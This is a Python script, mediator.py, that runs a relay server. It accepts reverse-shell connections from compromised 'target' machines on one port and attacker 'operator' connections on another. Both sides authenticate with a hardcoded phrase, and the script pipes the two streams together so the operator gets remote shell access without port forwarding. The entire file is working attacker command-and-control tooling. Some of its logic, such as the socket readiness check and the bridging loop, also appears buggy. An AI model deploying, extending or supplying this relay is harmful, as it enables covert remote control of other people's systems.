#!/usr/bin/python3
"""
Program: mediator.py
Author: C.J. May
Description: Bridge two connections to remotely connect an operator to a reverse shell without port forwarding
"""

import select
from socket import *
import subprocess
import threading


class Mediator:
    def __init__(self):
        # create reverse shell socket and bind it to a port
        self.targetServer = socket(AF_INET, SOCK_STREAM)
        self.targetServer.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        self.targetServer.bind(("0.0.0.0",20001))
        # create operator socket and bind it to a port
        self.operatorServer = socket(AF_INET, SOCK_STREAM)
        self.operatorServer.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        self.operatorServer.bind(("0.0.0.0",20000))
        # queue and match incoming connections
        self.targets = {}
        self.operators = {}
        # tell sockets to listen on respective ports for a max of 1 connection
        self.targetServer.listen(4)
        self.operatorServer.listen(4)
        self.connCount = 0

    def handleConnections(self):
        # make threads for connection handling and bridging
        targetHandler = threading.Thread(target=self.handleTargets)
        operatorHandler = threading.Thread(target=self.handleOperators)
        bridgeWorker = threading.Thread(target=self.bridgeConnections)
        # run in the background
        targetHandler.daemon = True
        operatorHandler.daemon = True
        bridgeWorker.daemon = True
        # start threads
        targetHandler.start()
        operatorHandler.start()
        bridgeWorker.start()

    def handleTargets(self):
        while True:
            # wait for reverse shell to connect 
            targetConnection, targetAddress = self.targetServer.accept()
            targetKey = None
            # validate connection is from our reverse shell
            ready = select.select([self.targetServer], [], [], 5)
            if ready[0]:
                targetKey = targetConnection.recv(1024)
            if targetKey:
                if targetKey.decode() != "I solemnly swear that I am up to no good.":
                    continue
            else:
                continue
            # add connection to queue
            self.targets[targetKey.decode()] = targetConnection
            print("Reverse shell connected from {}...".format(targetConnection.getpeername()[0]))

    def handleOperators(self):
        while True:
            # wait for operator to connect
            operatorConnection, operatorAddress = self.operatorServer.accept()
            operatorKey = None
            ready = select.select([self.operatorServer], [], [], 5)
            if ready[0]:
                operatorKey = operatorConnection.recv(1024)
            if operatorKey:
                if operatorKey.decode() != "I solemnly swear that I am up to no good.":
                    continue
            else:
                continue
            # add connection to queue
            self.operators[operatorKey.decode()] = operatorConnection
            print("Operator connected from {}...".format(operatorConnection.getpeername()[0]))

    def bridgeConnections(self):
        while True:
            for connectionKey, operatorConnection in self.operators.items():
                if connectionKey in self.targets:
                    targetConnection = self.targets[connectionKey]
                self.applyBlackMagic(operatorConnection, targetConnection)

    def applyBlackMagic(self, operatorConnection, targetConnection):
        # connect the streams with GNU black magic
        fromTarget = targetConnection.makefile("rb")
        toTarget = targetConnection.makefile("wb")
        fromOperator = operatorConnection.makefile("rb")
        toOperator = operatorConnection.makefile("wb")
        targetToOperator = subprocess.Popen("cat",
                                            stdin=fromTarget,
                                            stdout=toOperator,
                                            stderr=toOperator)
        operatorToTarget = subprocess.Popen("cat",
                                            stdin=fromOperator,
                                            stdout=toTarget,
                                            stderr=toTarget)
        print("Operator ({}) and target ({}) bridged... Connection ID {}".format(operatorConnection.getpeername()[0], targetConnection.getpeername()[0], self.connCount))
        # create thread to gracefully close connection when done
        terminatorThread = threading.Thread(target=self.waitAndTerminate,
                                            args=[targetToOperator,
                                                  operatorToTarget,
                                                  targetConnection,
                                                  operatorConnection,
                                                  self.connCount])
        terminatorThread.daemon = True
        terminatorThread.start()
        self.connCount += 1

    def waitAndTerminate(self, targetToOperator, operatorToTarget, targetSock, operatorSock, connID):
        # close connections when done
        targetToOperator.wait()
        operatorToTarget.wait()
        targetSock.close()
        operatorSock.close()

        # connections terminated
        print("Connection ID {} terminated.".format(connID))


if __name__ == "__main__":
    server = Mediator()
    server.handleConnections()
